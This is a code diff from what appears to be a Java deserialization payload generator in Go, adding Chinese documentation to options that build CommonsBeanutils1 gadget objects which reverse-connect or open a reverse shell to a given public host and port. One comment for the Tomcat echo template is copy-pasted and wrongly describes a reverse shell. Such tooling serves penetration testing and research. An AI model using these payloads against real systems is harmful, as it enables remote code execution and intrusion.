@@ -973,27 +973,89 @@ func GenEmptyClassInTemplateClassObject(options ...GenClassOptionFun) (*javaclas
 	return config.GenerateClassObject()
 }
 
-// 生成tcp反连
+// SetClassTcpReverseTemplate
+// useTcpReverseTemplate 请求参数选项函数，用于设置生成TcpReverse类的模板，需要配合 tcpReverseHost 和 tcpReversePort 使用。
+// 还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。
+//
+// Example:
+//
+// host = "公网IP"
+// token = uuid()
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
 func SetClassTcpReverseTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = TcpReverseClass
 	}
 }
+
+// SetTcpReverseHost
+// tcpReverseHost 请求参数选项函数，设置指定的 tcpReverseHost 域名，需要配合 useTcpReverseTemplate ，tcpReversePort 使用。
+// 还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。
+//
+// host：要设置的 tcpReverseHost 的host。
+//
+// Example:
+//
+// host = "公网IP"
+// token = uuid()
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
 func SetTcpReverseHost(host string) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.Host = host
 	}
 }
+
+// SetTcpReversePort
+// tcpReversePort 请求参数选项函数，设置指定的 tcpReversePort 域名，需要配合 useTcpReverseTemplate ，tcpReverseHost 使用。
+// 还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。
+//
+// port：要设置的 tcpReversePort 的port。
+//
+// Example:
+//
+// host = "公网IP"
+// token = uuid()
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
 func SetTcpReversePort(port int) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.Port = port
 	}
 }
+
+// SetTcpReverseToken
+// tcpReverseToken 请求参数选项函数，设置指定的 token 用于是否反连成功的标志，需要配合 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 使用。
+//
+// token：要设置的 token 。
+//
+// Example:
+//
+// host = "公网IP"
+// token = uuid()
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
 func SetTcpReverseToken(token string) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.Token = token
 	}
 }
+
+// SetTcpReverseEvilClass
+// useTcpReverseEvilClass 请求参数选项函数，设置生成TcpReverse类的模板，同时设置指定的 tcpReverseHost ，tcpReversePort。
+// 相当于 useTcpReverseTemplate ，tcpReverseHost  两个个函数的组合。
+//
+// host：要设置的 tcpReverseHost 的host。
+//
+// port：要设置的 tcpReversePort 的port。
+//
+// Example:
+//
+// host = "公网IP"
+// token = uuid()
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseEvilClass(host,8080),yso.tcpReverseToken(token))
 func SetTcpReverseEvilClass(host string, port int) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = TcpReverseClass
@@ -1001,6 +1063,26 @@ func SetTcpReverseEvilClass(host string, port int) GenClassOptionFun {
 		config.Port = port
 	}
 }
+
+// GenTcpReverseClassObject
+//
+// GenerateTcpReverseEvilClassObject 生成一个使用TcpReverse类模板的javaclassparser.ClassObject对象，
+// 这个函数结合使用 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 函数， 以生成在反序列化时会反连指定的 tcpReverseHost ，tcpReversePort 的Java对象。
+//
+// host：要设置的 tcpReverseHost 的host。
+//
+// port：要设置的 tcpReversePort 的port。
+//
+// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
+//
+// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+//
+// Example:
+//
+// host = "公网IP"
+// token = uuid()
+//
+// classObject, err := yso.GenerateTcpReverseEvilClassObject(host,8080,yso.tcpReverseToken(token),additionalOptions...) // 生成并配置TcpReverse Java对象
 func GenTcpReverseClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
 	config := NewClassConfig(options...)
 	config.Host = host
@@ -1009,12 +1091,34 @@ func GenTcpReverseClassObject(host string, port int, options ...GenClassOptionFu
 	return config.GenerateClassObject()
 }
 
-// 生成tcp反弹shell
+// SetClassTcpReverseShellTemplate
+// useTcpReverseShellTemplate 请求参数选项函数，用于设置生成TcpReverseShell类的模板，需要配合 tcpReverseShellHost 和 tcpReverseShellPort 使用。
+// 该参数与 useTcpReverseTemplate 的区别是，该参数生成的类会在反连成功后，执行一个反弹shell。
+//
+// Example:
+//
+// host = "公网IP"
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellTemplate(),yso.tcpReverseShellHost(host),yso.tcpReverseShellPort(8080))
 func SetClassTcpReverseShellTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = TcpReverseShellClass
 	}
 }
+
+// SetTcpReverseShellEvilClass
+// useTcpReverseShellEvilClass 请求参数选项函数，设置生成TcpReverseShell类的模板，同时设置指定的 tcpReverseShellHost ，tcpReverseShellPort。
+// 相当于 useTcpReverseShellTemplate ，tcpReverseShellHost，tcpReverseShellPort  三个个函数的组合。
+//
+// host：要设置的 tcpReverseShellHost 的host。
+//
+// port：要设置的 tcpReverseShellPort 的port。
+//
+// Example:
+//
+// host = "公网IP"
+//
+// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
 func SetTcpReverseShellEvilClass(host string, port int) GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = TcpReverseShellClass
@@ -1022,6 +1126,25 @@ func SetTcpReverseShellEvilClass(host string, port int) GenClassOptionFun {
 		config.Port = port
 	}
 }
+
+// GenTcpReverseShellClassObject
+//
+// GenerateTcpReverseShellEvilClassObject 生成一个使用TcpReverseShell类模板的javaclassparser.ClassObject对象，
+// 这个函数结合使用 useTcpReverseShellTemplate ，tcpReverseShellHost ，tcpReverseShellPort 函数， 以生成在反序列化时会反连指定的 tcpReverseShellHost ，tcpReverseShellPort 的Java对象。
+//
+// host：要设置的 tcpReverseShellHost 的host。
+//
+// port：要设置的 tcpReverseShellPort 的port。
+//
+// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
+//
+// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+//
+// Example:
+//
+// host = "公网IP"
+//
+// classObject, err := yso.GenerateTcpReverseShellEvilClassObject(host,8080,additionalOptions...) // 生成并配置TcpReverseShell Java对象
 func GenTcpReverseShellClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
 	config := NewClassConfig(options...)
 	config.Host = host
@@ -1030,7 +1153,10 @@ func GenTcpReverseShellClassObject(host string, port int, options ...GenClassOpt
 	return config.GenerateClassObject()
 }
 
-// Tomcat回显
+// SetClassTomcatEchoTemplate
+// useTomcatEchoTemplate 请求参数选项函数，用于设置生成TomcatEcho类的模板，需要配合 tomcatEchoHost 和 tomcatEchoPort 使用。
+// 该参数与 useTcpReverseTemplate 的区别是，该参数生成的类会在反连成功后，执行一个反弹shell。
+
 func SetClassTomcatEchoTemplate() GenClassOptionFun {
 	return func(config *ClassConfig) {
 		config.ClassType = TomcatEchoClass
